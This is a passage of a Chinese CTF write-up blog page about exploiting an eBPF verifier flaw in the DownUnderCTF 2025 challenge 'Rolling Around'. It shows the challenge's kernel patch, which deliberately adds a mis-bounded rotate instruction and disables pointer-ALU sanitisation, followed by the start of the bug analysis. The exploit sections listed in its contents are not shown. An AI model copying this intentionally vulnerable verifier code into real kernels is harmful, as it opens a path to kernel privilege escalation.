<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="写在最前面由于考研的缘故，博客的更新频率大幅度下降（也因为这个原因这篇博客笔者分了好几天来写），趁现在还没有进入冲刺阶段再水一篇（bushi   不知道为何，eBPF 这个老古董最近在 CTF 里面重新焕发了生机，这篇博客以 DownUnderCTF 2025 的 Rolling Around 为例讲解一下 eBPF 漏洞的利用方式。为了展示更多的东西，笔者将会 “绕远路” ，使用稍微复杂一点的方">
<meta property="og:type" content="article">
<meta property="og:title" content="Jailbreaking eBPF">
<meta property="og:url" content="https://qanux.github.io/2025/07/24/ebpf/index.html">
<meta property="og:site_name" content="Qanux&#39;s space">
<meta property="og:description" content="写在最前面由于考研的缘故，博客的更新频率大幅度下降（也因为这个原因这篇博客笔者分了好几天来写），趁现在还没有进入冲刺阶段再水一篇（bushi   不知道为何，eBPF 这个老古董最近在 CTF 里面重新焕发了生机，这篇博客以 DownUnderCTF 2025 的 Rolling Around 为例讲解一下 eBPF 漏洞的利用方式。为了展示更多的东西，笔者将会 “绕远路” ，使用稍微复杂一点的方">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://qanux.github.io/2025/07/24/ebpf/2.png">
<meta property="og:image" content="https://qanux.github.io/2025/07/24/ebpf/1.png">
<meta property="og:image" content="https://qanux.github.io/2025/07/24/ebpf/0.png">
<meta property="article:published_time" content="2025-07-23T16:00:00.000Z">
<meta property="article:modified_time" content="2025-07-24T12:32:43.053Z">
<meta property="article:author" content="Qanux">
<meta property="article:tag" content="CsomePro">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://qanux.github.io/2025/07/24/ebpf/2.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.jpg">
        
      
    
    <!-- title -->
    <title>Jailbreaking eBPF</title>
    <!-- async scripts -->
    <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?dfa426831961b1170306cf91cfce69b4";
      var s = document.getElementsByTagName("script")[0]; 
      s.parentNode.insertBefore(hm, s);
    })();
    </script>
    
    
    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Qanux's space" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/friend/">Link</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/07/27/not_easy_v8/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/07/07/2025%E5%B0%8F%E7%90%90%E7%A2%8E/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qanux.github.io/2025/07/24/ebpf/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qanux.github.io/2025/07/24/ebpf/&text=Jailbreaking eBPF"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qanux.github.io/2025/07/24/ebpf/&title=Jailbreaking eBPF"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qanux.github.io/2025/07/24/ebpf/&is_video=false&description=Jailbreaking eBPF"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Jailbreaking eBPF&body=Check out this article: https://qanux.github.io/2025/07/24/ebpf/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qanux.github.io/2025/07/24/ebpf/&title=Jailbreaking eBPF"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qanux.github.io/2025/07/24/ebpf/&title=Jailbreaking eBPF"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qanux.github.io/2025/07/24/ebpf/&title=Jailbreaking eBPF"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qanux.github.io/2025/07/24/ebpf/&title=Jailbreaking eBPF"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qanux.github.io/2025/07/24/ebpf/&name=Jailbreaking eBPF&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qanux.github.io/2025/07/24/ebpf/&t=Jailbreaking eBPF"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在最前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E8%A6%81%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">3.1.</span> <span class="toc-text">重要结构体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2"><span class="toc-number">3.2.</span> <span class="toc-text">地址泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-number">3.3.</span> <span class="toc-text">任意地址写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%ACmodprobe"><span class="toc-number">4.</span> <span class="toc-text">高版本modprobe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">5.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Jailbreaking eBPF
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Qanux</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-07-23T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-07-24</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h2><p>由于考研的缘故，博客的更新频率大幅度下降（也因为这个原因这篇博客笔者分了好几天来写），趁现在还没有进入冲刺阶段再水一篇（bushi  </p>
<p>不知道为何，eBPF 这个老古董最近在 CTF 里面重新焕发了生机，这篇博客以 DownUnderCTF 2025 的 Rolling Around 为例讲解一下 eBPF 漏洞的利用方式。为了展示更多的东西，笔者将会 “绕远路” ，使用稍微复杂一点的方法来进行漏洞的利用  </p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里先给出 patch 文件<br><strong>kernel.patch</strong></p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/include/uapi/linux/bpf.h b/include/uapi/linux/bpf.h</span></span><br><span class="line"><span class="comment">index 85180e4aa..5290a994d 100644</span></span><br><span class="line"><span class="comment">--- a/include/uapi/linux/bpf.h</span></span><br><span class="line"><span class="comment">+++ b/include/uapi/linux/bpf.h</span></span><br><span class="line"><span class="meta">@@ -34,6 +34,9 @@</span></span><br><span class="line"> #define BPF_FROM_LE	BPF_TO_LE</span><br><span class="line"> #define BPF_FROM_BE	BPF_TO_BE</span><br><span class="line"> </span><br><span class="line"><span class="addition">+/* alu fields */</span></span><br><span class="line"><span class="addition">+#define BPF_ROL         0xe0</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> /* jmp encodings */</span><br><span class="line"> #define BPF_JNE		0x50	/* jump != */</span><br><span class="line"> #define BPF_JLT		0xa0	/* LT is unsigned, &#x27;&lt;&#x27; */</span><br><span class="line"><span class="comment">diff --git a/kernel/bpf/core.c b/kernel/bpf/core.c</span></span><br><span class="line"><span class="comment">index c20babbf9..b79fbeb46 100644</span></span><br><span class="line"><span class="comment">--- a/kernel/bpf/core.c</span></span><br><span class="line"><span class="comment">+++ b/kernel/bpf/core.c</span></span><br><span class="line"><span class="meta">@@ -1578,6 +1578,7 @@</span> EXPORT_SYMBOL_GPL(__bpf_call_base);</span><br><span class="line"> 	INSN_3(ALU, ARSH, K),			\</span><br><span class="line"> 	INSN_3(ALU, DIV,  K),			\</span><br><span class="line"> 	INSN_3(ALU, MOD,  K),			\</span><br><span class="line"><span class="addition">+	INSN_3(ALU, ROL,  K),			\</span></span><br><span class="line"> 	/* 64 bit ALU operations. */		\</span><br><span class="line"> 	/*   Register based. */			\</span><br><span class="line"> 	INSN_3(ALU64, ADD,  X),			\</span><br><span class="line"><span class="meta">@@ -1607,6 +1608,7 @@</span> EXPORT_SYMBOL_GPL(__bpf_call_base);</span><br><span class="line"> 	INSN_3(ALU64, ARSH, K),			\</span><br><span class="line"> 	INSN_3(ALU64, DIV,  K),			\</span><br><span class="line"> 	INSN_3(ALU64, MOD,  K),			\</span><br><span class="line"><span class="addition">+	INSN_3(ALU64, ROL,  K),			\</span></span><br><span class="line"> 	/* Call instruction. */			\</span><br><span class="line"> 	INSN_2(JMP, CALL),			\</span><br><span class="line"> 	/* Exit instruction. */			\</span><br><span class="line"><span class="meta">@@ -1743,6 +1745,7 @@</span> static u64 ___bpf_prog_run(u64 *regs, const struct bpf_insn *insn)</span><br><span class="line"> 		[BPF_LDX | BPF_PROBE_MEMSX | BPF_H] = &amp;&amp;LDX_PROBE_MEMSX_H,</span><br><span class="line"> 		[BPF_LDX | BPF_PROBE_MEMSX | BPF_W] = &amp;&amp;LDX_PROBE_MEMSX_W,</span><br><span class="line"> 	&#125;;</span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> #undef BPF_INSN_3_LBL</span><br><span class="line"> #undef BPF_INSN_2_LBL</span><br><span class="line"> 	u32 tail_call_cnt = 0;</span><br><span class="line"><span class="meta">@@ -1859,6 +1862,12 @@</span> static u64 ___bpf_prog_run(u64 *regs, const struct bpf_insn *insn)</span><br><span class="line"> 	ALU64_ARSH_K:</span><br><span class="line"> 		(*(s64 *) &amp;DST) &gt;&gt;= IMM;</span><br><span class="line"> 		CONT;</span><br><span class="line"><span class="addition">+	ALU_ROL_K:</span></span><br><span class="line"><span class="addition">+		DST = (((u32)DST) &lt;&lt; IMM) | (((u32)DST) &gt;&gt; (32 - IMM));		</span></span><br><span class="line"><span class="addition">+		CONT;</span></span><br><span class="line"><span class="addition">+	ALU64_ROL_K:</span></span><br><span class="line"><span class="addition">+		DST = (DST &lt;&lt; IMM) | (DST &gt;&gt; (64 - IMM));		</span></span><br><span class="line"><span class="addition">+		CONT;</span></span><br><span class="line"> 	ALU64_MOD_X:</span><br><span class="line"> 		switch (OFF) &#123;</span><br><span class="line"> 		case 0:</span><br><span class="line"><span class="comment">diff --git a/kernel/bpf/disasm.c b/kernel/bpf/disasm.c</span></span><br><span class="line"><span class="comment">index 20883c6b1..859662559 100644</span></span><br><span class="line"><span class="comment">--- a/kernel/bpf/disasm.c</span></span><br><span class="line"><span class="comment">+++ b/kernel/bpf/disasm.c</span></span><br><span class="line"><span class="meta">@@ -85,6 +85,7 @@</span> const char *const bpf_alu_string[16] = &#123;</span><br><span class="line"> 	[BPF_MOV &gt;&gt; 4]  = &quot;=&quot;,</span><br><span class="line"> 	[BPF_ARSH &gt;&gt; 4] = &quot;s&gt;&gt;=&quot;,</span><br><span class="line"> 	[BPF_END &gt;&gt; 4]  = &quot;endian&quot;,</span><br><span class="line"><span class="addition">+	[BPF_ROL &gt;&gt; 4]  = &quot;rol&quot;,</span></span><br><span class="line"> &#125;;</span><br><span class="line"> </span><br><span class="line"> static const char *const bpf_alu_sign_string[16] = &#123;</span><br><span class="line"><span class="comment">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c</span></span><br><span class="line"><span class="comment">index a7d6e0c59..d2f97d018 100644</span></span><br><span class="line"><span class="comment">--- a/kernel/bpf/verifier.c</span></span><br><span class="line"><span class="comment">+++ b/kernel/bpf/verifier.c</span></span><br><span class="line"><span class="meta">@@ -14091,8 +14091,8 @@</span> static int sanitize_ptr_alu(struct bpf_verifier_env *env,</span><br><span class="line"> 	bool ptr_is_dst_reg = ptr_reg == dst_reg;</span><br><span class="line"> 	u8 opcode = BPF_OP(insn-&gt;code);</span><br><span class="line"> 	u32 alu_state, alu_limit;</span><br><span class="line"><span class="deletion">-	struct bpf_reg_state tmp;</span></span><br><span class="line"><span class="deletion">-	bool ret;</span></span><br><span class="line"><span class="addition">+	//struct bpf_reg_state tmp;</span></span><br><span class="line"><span class="addition">+	//bool ret;</span></span><br><span class="line"> 	int err;</span><br><span class="line"> </span><br><span class="line"> 	if (can_skip_alu_sanitation(env, insn))</span><br><span class="line"><span class="meta">@@ -14161,6 +14161,8 @@</span> static int sanitize_ptr_alu(struct bpf_verifier_env *env,</span><br><span class="line"> 	 * and truncated reg-based in the other in order to explore</span><br><span class="line"> 	 * bad access.</span><br><span class="line"> 	 */</span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+	/*</span></span><br><span class="line"> 	if (!ptr_is_dst_reg) &#123;</span><br><span class="line"> 		tmp = *dst_reg;</span><br><span class="line"> 		copy_register_state(dst_reg, ptr_reg);</span><br><span class="line"><span class="meta">@@ -14170,6 +14172,8 @@</span> static int sanitize_ptr_alu(struct bpf_verifier_env *env,</span><br><span class="line"> 	if (!ptr_is_dst_reg &amp;&amp; ret)</span><br><span class="line"> 		*dst_reg = tmp;</span><br><span class="line"> 	return !ret ? REASON_STACK : 0;</span><br><span class="line"><span class="addition">+	*/</span></span><br><span class="line"><span class="addition">+	return 0;</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> static void sanitize_mark_insn_seen(struct bpf_verifier_env *env)</span><br><span class="line"><span class="meta">@@ -15050,6 +15054,48 @@</span> static void scalar_min_max_arsh(struct bpf_reg_state *dst_reg,</span><br><span class="line"> 	__update_reg_bounds(dst_reg);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+static void __scalar32_min_max_rol(struct bpf_reg_state *dst_reg,</span></span><br><span class="line"><span class="addition">+				   u64 umin_val, u64 umax_val)</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+	dst_reg-&gt;u32_min_value = (dst_reg-&gt;u32_min_value &lt;&lt; umin_val) | (dst_reg-&gt;u32_min_value &gt;&gt; (64 - umin_val));</span></span><br><span class="line"><span class="addition">+	dst_reg-&gt;u32_max_value = (dst_reg-&gt;u32_max_value &lt;&lt; umax_val) | (dst_reg-&gt;u32_max_value &gt;&gt; (64 - umax_val));</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+static void scalar32_min_max_rol(struct bpf_reg_state *dst_reg,</span></span><br><span class="line"><span class="addition">+				 struct bpf_reg_state *src_reg)</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+	u32 umax_val = src_reg-&gt;u32_max_value;</span></span><br><span class="line"><span class="addition">+	u32 umin_val = src_reg-&gt;u32_min_value;</span></span><br><span class="line"><span class="addition">+	/* u32 alu operation will zext upper bits */</span></span><br><span class="line"><span class="addition">+	struct tnum subreg = tnum_subreg(dst_reg-&gt;var_off);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+	__scalar32_min_max_rol(dst_reg, umin_val, umax_val);</span></span><br><span class="line"><span class="addition">+	dst_reg-&gt;var_off = tnum_subreg(tnum_lshift(subreg, umin_val));</span></span><br><span class="line"><span class="addition">+	__mark_reg64_unbounded(dst_reg);</span></span><br><span class="line"><span class="addition">+	__update_reg32_bounds(dst_reg);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+static void __scalar64_min_max_rol(struct bpf_reg_state *dst_reg,</span></span><br><span class="line"><span class="addition">+				   u64 umin_val, u64 umax_val)</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+	dst_reg-&gt;umin_value = (dst_reg-&gt;umin_value &lt;&lt; umin_val) | (dst_reg-&gt;umin_value &gt;&gt; (64 - umin_val));</span></span><br><span class="line"><span class="addition">+	dst_reg-&gt;umax_value = (dst_reg-&gt;umax_value &lt;&lt; umax_val) | (dst_reg-&gt;umax_value &gt;&gt; (64 - umax_val));</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+static void scalar_min_max_rol(struct bpf_reg_state *dst_reg,</span></span><br><span class="line"><span class="addition">+			       struct bpf_reg_state *src_reg)</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+	u64 umax_val = src_reg-&gt;umax_value;</span></span><br><span class="line"><span class="addition">+	u64 umin_val = src_reg-&gt;umin_value;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+	__scalar64_min_max_rol(dst_reg, umin_val, umax_val);</span></span><br><span class="line"><span class="addition">+	__scalar32_min_max_rol(dst_reg, umin_val, umax_val);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+	dst_reg-&gt;var_off = tnum_lshift(dst_reg-&gt;var_off, umin_val);</span></span><br><span class="line"><span class="addition">+	/* We may learn something more from the var_off */</span></span><br><span class="line"><span class="addition">+	__update_reg_bounds(dst_reg);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> static bool is_safe_to_compute_dst_reg_range(struct bpf_insn *insn,</span><br><span class="line"> 					     const struct bpf_reg_state *src_reg)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="meta">@@ -15084,12 +15130,14 @@</span> static bool is_safe_to_compute_dst_reg_range(struct bpf_insn *insn,</span><br><span class="line"> 	case BPF_LSH:</span><br><span class="line"> 	case BPF_RSH:</span><br><span class="line"> 	case BPF_ARSH:</span><br><span class="line"><span class="addition">+	case BPF_ROL:</span></span><br><span class="line"> 		return (src_is_const &amp;&amp; src_reg-&gt;umax_value &lt; insn_bitness);</span><br><span class="line"> 	default:</span><br><span class="line"> 		return false;</span><br><span class="line"> 	&#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> /* WARNING: This function does calculations on 64-bit values, but the actual</span><br><span class="line">  * execution may occur on 32-bit values. Therefore, things like bitshifts</span><br><span class="line">  * need extra checks in the 32-bit case.</span><br><span class="line"><span class="meta">@@ -15177,6 +15225,12 @@</span> static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,</span><br><span class="line"> 		else</span><br><span class="line"> 			scalar_min_max_arsh(dst_reg, &amp;src_reg);</span><br><span class="line"> 		break;</span><br><span class="line"><span class="addition">+	case BPF_ROL:</span></span><br><span class="line"><span class="addition">+		if (alu32)</span></span><br><span class="line"><span class="addition">+			scalar32_min_max_rol(dst_reg, &amp;src_reg);</span></span><br><span class="line"><span class="addition">+		else</span></span><br><span class="line"><span class="addition">+			scalar_min_max_rol(dst_reg, &amp;src_reg);</span></span><br><span class="line"><span class="addition">+		break;</span></span><br><span class="line"> 	default:</span><br><span class="line"> 		break;</span><br><span class="line"> 	&#125;</span><br><span class="line"><span class="meta">@@ -15185,6 +15239,7 @@</span> static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,</span><br><span class="line"> 	if (alu32)</span><br><span class="line"> 		zext_32_to_64(dst_reg);</span><br><span class="line"> 	reg_bounds_sync(dst_reg);</span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> 	return 0;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -15510,7 +15565,7 @@</span> static int check_alu_op(struct bpf_verifier_env *env, struct bpf_insn *insn)</span><br><span class="line"> 			&#125;</span><br><span class="line"> 		&#125;</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-	&#125; else if (opcode &gt; BPF_END) &#123;</span></span><br><span class="line"><span class="addition">+	&#125; else if (opcode &gt; BPF_ROL) &#123;</span></span><br><span class="line"> 		verbose(env, &quot;invalid BPF_ALU opcode %x\n&quot;, opcode);</span><br><span class="line"> 		return -EINVAL;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -15546,7 +15601,7 @@</span> static int check_alu_op(struct bpf_verifier_env *env, struct bpf_insn *insn)</span><br><span class="line"> 		&#125;</span><br><span class="line"> </span><br><span class="line"> 		if ((opcode == BPF_LSH || opcode == BPF_RSH ||</span><br><span class="line"><span class="deletion">-		     opcode == BPF_ARSH) &amp;&amp; BPF_SRC(insn-&gt;code) == BPF_K) &#123;</span></span><br><span class="line"><span class="addition">+		     opcode == BPF_ARSH || opcode == BPF_ROL) &amp;&amp; BPF_SRC(insn-&gt;code) == BPF_K) &#123;</span></span><br><span class="line"> 			int size = BPF_CLASS(insn-&gt;code) == BPF_ALU64 ? 64 : 32;</span><br><span class="line"> </span><br><span class="line"> 			if (insn-&gt;imm &lt; 0 || insn-&gt;imm &gt;= size) &#123;</span><br></pre></td></tr></table></figure>

<p>环境的 kernel 版本为 6.15  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ $ <span class="built_in">uname</span> -r</span><br><span class="line">6.15.0-gf66bc387efbe-dirty</span><br></pre></td></tr></table></figure>

<p>这个 patch 实现了一个 eBPF 立即数的左移运算，支持 32 位和 64 位，漏洞为 __scalar32_min_max_rol 函数中错误地使用了 64 而不是 32，导致寄存器状态的最小值&#x2F;最大值跟踪逻辑错误   </p>
